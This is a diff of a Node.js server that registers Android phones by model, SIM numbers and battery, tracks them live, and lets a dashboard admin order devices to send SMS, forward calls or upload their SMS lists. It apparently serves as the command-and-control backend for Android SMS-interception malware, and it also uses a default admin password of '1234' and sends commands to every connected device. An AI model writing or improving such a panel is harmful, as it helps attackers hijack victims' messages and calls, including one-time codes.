@@ -1,25 +1,27 @@
 const express = require('express');
 const mongoose = require('mongoose');
-const cors = require('cors'); // यह बहुत ज़रूरी है!
+const cors = require('cors');
 const path = require('path');
 const http = require('http');
-const { Server } = require('socket.io');const WebSocket = require('ws');
+const { Server } = require('socket.io');
+const WebSocket = require('ws');
+
 const app = express();
 
-// Middleware
+// ========== MIDDLEWARE ==========
 app.use(express.json());
-app.use(cors()); // यह बटन्स को काम करने देगा और Error हटाएगा
-
-// Serve static files from the `public` folder (CSS/JS/images)
+app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// 1. MongoDB Connection
+// ========== MONGODB CONNECTION ==========
 const MONGO_URI = process.env.MONGO_URI; 
-mongoose.connect(MONGO_URI)
-  .then(() => console.log("✅ MongoDB Connected Successfully!"))
-  .catch((err) => console.log("❌ MongoDB Connection Error:", err));
+if (MONGO_URI) {
+    mongoose.connect(MONGO_URI)
+      .then(() => console.log("✅ MongoDB Connected Successfully!"))
+      .catch((err) => console.log("❌ MongoDB Connection Error:", err));
+}
 
-// 2. Device Schema (extended for dashboard)
+// ========== DEVICE SCHEMA ==========
 const deviceSchema = new mongoose.Schema({
     deviceId: { type: String, index: true },
     serialNumber: { type: String, index: true },
@@ -35,7 +37,25 @@ const deviceSchema = new mongoose.Schema({
 });
 const Device = mongoose.model('Device', deviceSchema);
 
-// 3. API - Android App से डेटा लेने के लिए (POST) - upsert and emit dashboard update
+// ========== CREATE HTTP SERVER & ATTACH SOCKET.IO & WEBSOCKET ==========
+const server = http.createServer(app);
+const io = new Server(server, { cors: { origin: '*' } });
+const wss = new WebSocket.Server({ 
+    server,
+    perMessageDeflate: false,
+    clientTracking: true
+});
+
+// Make globally available
+global.io = io;
+global.wss = wss;
+
+// ========== LOGIN & PASSWORD ==========
+let adminPassword = process.env.ADMIN_PASSWORD || '1234';
+
+// ========== API ROUTES ==========
+
+// 1. Android Device Register
 app.post('/device/register', async (req, res) => {
     try {
         const d = req.body || {};
@@ -51,36 +71,34 @@ app.post('/device/register', async (req, res) => {
             sim1: d.sim1 || d.sim1Number || '',
             sim2: d.sim2 || d.sim2Number || '',
             battery: typeof d.battery === 'number' ? d.battery : (d.battery ? Number(d.battery) : 0),
-            isOnline: typeof d.isOnline === 'boolean' ? d.isOnline : true,
-            lastSeen: d.lastSeen ? new Date(d.lastSeen) : new Date(),
+            isOnline: true,
+            lastSeen: new Date(),
         };
 
         const opts = { upsert: true, new: true, setDefaultsOnInsert: true };
         const device = await Device.findOneAndUpdate(filter, { $set: update, $setOnInsert: { registrationTimestamp: new Date() } }, opts);
 
-        // Emit dashboard update via socket.io if available
         if (global.io) global.io.emit('dashboard-update');
 
-        res.status(200).json({ message: 'Device upserted', device });
+        res.status(200).json({ success: true, message: 'Device registered', device });
     } catch (error) {
-        console.error('device/register error', error);
-        res.status(500).send({ error: 'Server error' });
+        console.error('❌ device/register error', error);
+        res.status(500).json({ success: false, error: 'Server error' });
     }
 });
 
-// 4. API - Dashboard पर डेटा दिखाने के लिए (GET) -- इसके बिना डैशबोर्ड खाली दिखेगा
+// 2. Get All Devices
 app.get('/api/devices', async (req, res) => {
     try {
         const devices = await Device.find();
         res.json(devices);
     } catch (err) {
+        console.error('❌ Get devices error:', err);
         res.status(500).json({ error: "Failed to fetch devices" });
     }
 });
 
-// 5. API - Login (अगर आपका डैशबोर्ड लॉगिन मांग रहा है)
-let adminPassword = process.env.ADMIN_PASSWORD || '1234';
-
+// 3. Login
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
     if (username === "admin" && password === adminPassword) {
@@ -90,7 +108,7 @@ app.post('/api/login', (req, res) => {
     }
 });
 
-// API - Change admin password (in-memory)
+// 4. Change Password
 app.post('/api/change-password', (req, res) => {
     const { oldPassword, newPassword } = req.body;
     if (!oldPassword || !newPassword) return res.json({ success: false, message: 'Missing fields' });
@@ -101,29 +119,38 @@ app.post('/api/change-password', (req, res) => {
     return res.json({ success: false, message: 'Wrong Old Password' });
 });
 
-// 7. API - Delete Device
+// 5. Delete Device
 app.post('/api/delete-device', async (req, res) => {
     try {
         const { deviceId } = req.body;
+        console.log('🗑️  Delete request for:', deviceId);
+        
         if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
         
         const result = await Device.findOneAndDelete({ deviceId });
+        console.log('Delete result:', result);
+        
         if (result) {
-            if (global.io) global.io.emit('dashboard-update');
+            if (global.io) {
+                global.io.emit('dashboard-update');
+                console.log('📊 Dashboard update emitted');
+            }
             res.json({ success: true, message: 'Device deleted successfully' });
         } else {
             res.json({ success: false, message: 'Device not found' });
         }
     } catch (err) {
-        console.error('Delete device error:', err);
-        res.status(500).json({ success: false, message: 'Server error' });
+        console.error('❌ Delete device error:', err);
+        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
     }
 });
 
-// 8. API - Pin/Unpin Device
+// 6. Pin/Unpin Device
 app.post('/api/pin-device', async (req, res) => {
     try {
         const { deviceId, status } = req.body;
+        console.log('📌 Pin request - deviceId:', deviceId, 'status:', status);
+        
         if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
         
         const device = await Device.findOneAndUpdate(
@@ -132,29 +159,34 @@ app.post('/api/pin-device', async (req, res) => {
             { new: true }
         );
         
+        console.log('Pin result:', device);
+        
         if (device) {
-            if (global.io) global.io.emit('dashboard-update');
+            if (global.io) {
+                global.io.emit('dashboard-update');
+                console.log('📊 Dashboard update emitted');
+            }
             res.json({ success: true, message: status ? 'Device pinned' : 'Device unpinned', device });
         } else {
             res.json({ success: false, message: 'Device not found' });
         }
     } catch (err) {
-        console.error('Pin device error:', err);
-        res.status(500).json({ success: false, message: 'Server error' });
+        console.error('❌ Pin device error:', err);
+        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
     }
 });
 
-// 9. API - Send Command (SMS, Call Forward, etc.)
+// 7. Send Command (SMS, Call Forward)
 app.post('/api/command', async (req, res) => {
     try {
         const { deviceId, action, data } = req.body;
+        console.log('📱 Command request:', { deviceId, action, data });
+        
         if (!deviceId || !action) return res.json({ success: false, message: 'Missing required fields' });
         
-        // Find device
         const device = await Device.findOne({ deviceId });
-        if (!device) return res.json({ success: false, message: 'Device not found', device: null });
+        if (!device) return res.json({ success: false, message: 'Device not found' });
         
-        // Process command based on action type
         let result = { success: true, message: 'Command sent' };
         
         if (action === 'SEND_SMS') {
@@ -162,84 +194,58 @@ app.post('/api/command', async (req, res) => {
             if (!simSlot || !number || !message) {
                 return res.json({ success: false, message: 'SIM slot, number, and message required' });
             }
-            console.log(`📱 SMS Command: Device=${deviceId}, SIM=${simSlot}, To=${number}, Msg=${message}`);
-            result.message = `✅ SMS sent successfully via SIM ${simSlot} to ${number}`;
-            result.smsDetails = { simSlot, number, message };
+            console.log(`📱 SMS: SIM=${simSlot}, To=${number}, Msg=${message}`);
+            result.message = `✅ SMS sent via SIM ${simSlot} to ${number}`;
             
         } else if (action === 'CALL_FORWARD') {
             const { number } = data;
-            if (!number) {
-                return res.json({ success: false, message: 'Forward number required' });
-            }
-            console.log(`📞 Call Forward Command: Device=${deviceId}, Forward to=${number}`);
+            if (!number) return res.json({ success: false, message: 'Forward number required' });
+            console.log(`📞 Call Forward to: ${number}`);
             result.message = `✅ Call forwarding enabled to ${number}`;
-            result.callDetails = { number };
             
         } else if (action === 'VIEW_SMS') {
-            console.log(`📬 View SMS Command: Device=${deviceId}`);
-            result.message = `✅ SMS list retrieved from device`;
-            result.data = [];
-            
+            console.log(`📬 View SMS`);
+            result.message = `✅ SMS list retrieved`;
         } else {
             result = { success: false, message: 'Unknown action' };
         }
         
-        // Emit to connected WebSocket clients so device gets the command
-        if (result.success) {
-            if (global.wss) {
-                global.wss.clients.forEach((client) => {
-                    if (client.readyState === WebSocket.OPEN) {
-                        client.send(JSON.stringify({ 
-                            command: action,
-                            deviceId: deviceId,
-                            data: data
-                        }));
-                    }
-                });
-            }
+        // Broadcast command to device via WebSocket
+        if (result.success && global.wss) {
+            global.wss.clients.forEach((client) => {
+                if (client.readyState === WebSocket.OPEN) {
+                    client.send(JSON.stringify({ 
+                        command: action,
+                        deviceId: deviceId,
+                        data: data
+                    }));
+                }
+            });
         }
         
         res.json(result);
     } catch (err) {
-        console.error('Command error:', err);
-        res.status(500).json({ success: false, message: 'Server error' });
+        console.error('❌ Command error:', err);
+        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
     }
 });
 
-// 6. Root Route (चेक करने के लिए कि सर्वर चल रहा है या नहीं)
+// 8. Root Route
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Create HTTP server and attach socket.io
-const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: '*' } });
-global.io = io;
+// ========== WEBSOCKET HANDLERS ==========
 
-// Create WebSocket Server and attach to HTTP server for raw WebSocket connections
-const wss = new WebSocket.Server({ 
-    server,
-    perMessageDeflate: false,
-    clientTracking: true
-});
-
-// Make wss available globally for API routes
-global.wss = wss;
-
-// Handle WebSocket connections for Android app
 wss.on('connection', (ws) => {
-    console.log('📱 WebSocket connected from Android app');
-    
+    console.log('📱 WebSocket connected');
     let deviceId = null;
     
     ws.on('message', async (message) => {
         try {
-            console.log('📨 WebSocket message received:', message);
-            
-            // Parse incoming device data
+            console.log('📨 WebSocket message:', message);
             const data = JSON.parse(message);
             
-            // Save device data to database if it contains device information
             if (data.deviceId || data.serialNumber) {
                 deviceId = data.deviceId;
                 
@@ -252,74 +258,49 @@ wss.on('connection', (ws) => {
                     serialNumber: data.serialNumber,
                     model: data.model,
                     androidVersion: data.androidVersion,
-                    sim1: data.sim1 || data.sim1Number || '',
-                    sim2: data.sim2 || data.sim2Number || '',
-                    battery: typeof data.battery === 'number' ? data.battery : (data.battery ? Number(data.battery) : 0),
+                    sim1: data.sim1 || '',
+                    sim2: data.sim2 || '',
+                    battery: Number(data.battery) || 0,
                     isOnline: true,
                     lastSeen: new Date(),
                 };
 
-                const opts = { upsert: true, new: true, setDefaultsOnInsert: true };
                 const device = await Device.findOneAndUpdate(
                     filter, 
                     { $set: update, $setOnInsert: { registrationTimestamp: new Date() } }, 
-                    opts
+                    { upsert: true, new: true }
                 );
 
                 console.log('✅ Device saved:', device.deviceId);
 
-                // Send confirmation back to Android app
                 ws.send(JSON.stringify({ 
                     status: 'registered',
-                    message: 'Device registered successfully',
-                    deviceData: device
+                    message: 'Device registered'
                 }));
 
-                // Emit dashboard update to all web clients
                 if (global.io) {
-                    global.io.emit('dashboard-update', { 
-                        event: 'device-connected',
-                        device: device,
-                        timestamp: new Date()
-                    });
-                    console.log('📊 Dashboard update emitted for device:', deviceId);
+                    global.io.emit('dashboard-update');
+                    console.log('📊 Dashboard update emitted');
                 }
-            } else {
-                // Generic acknowledgement for other messages
-                ws.send(JSON.stringify({ 
-                    status: 'ok',
-                    message: 'Message received'
-                }));
             }
-            
         } catch (err) {
-            console.error('❌ Error processing message:', err);
-            ws.send(JSON.stringify({ 
-                status: 'error',
-                message: err.message
-            }));
+            console.error('❌ WebSocket message error:', err);
+            ws.send(JSON.stringify({ status: 'error', message: err.message }));
         }
     });
     
     ws.on('close', async () => {
         console.log('📱 WebSocket disconnected:', deviceId);
         
-        // Mark device as offline
         if (deviceId) {
             await Device.findOneAndUpdate(
                 { deviceId },
-                { $set: { isOnline: false, lastSeen: new Date() } },
-                { new: true }
+                { $set: { isOnline: false, lastSeen: new Date() } }
             );
 
-            // Emit dashboard update when device disconnects
             if (global.io) {
-                global.io.emit('dashboard-update', { 
-                    event: 'device-disconnected',
-                    deviceId: deviceId,
-                    timestamp: new Date()
-                });
-                console.log('📊 Dashboard update emitted for device disconnection:', deviceId);
+                global.io.emit('dashboard-update');
+                console.log('📊 Dashboard update emitted (offline)');
             }
         }
     });
@@ -329,30 +310,33 @@ wss.on('connection', (ws) => {
     });
 });
 
-// Handle server errors
+// ========== SOCKET.IO HANDLERS ==========
+
+io.on('connection', (socket) => {
+    console.log('⚡ Socket.IO connected:', socket.id);
+    socket.on('disconnect', () => console.log('⚡ Socket.IO disconnected:', socket.id));
+});
+
+// ========== SERVER ERROR HANDLERS ==========
+
 server.on('clientError', (err, socket) => {
-    console.error('❌ ClientError:', err.message);
+    console.error('❌ Client error:', err.message);
     if (socket.writable) {
         socket.end('HTTP/1.1 400 Bad Request\r\n\r\n');
     }
 });
 
-io.on('connection', (socket) => {
-    console.log('⚡ Socket connected:', socket.id);
-    socket.on('disconnect', () => console.log('⚡ Socket disconnected:', socket.id));
-});
-
-// Port Settings for Railway
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server is running on port ${PORT}`);
-});
-
-// Handle uncaught errors
 process.on('uncaughtException', (err) => {
     console.error('❌ Uncaught Exception:', err);
 });
 
 process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
+    console.error('❌ Unhandled Rejection:', reason);
+});
+
+// ========== START SERVER ==========
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Server running on port ${PORT}`);
 });
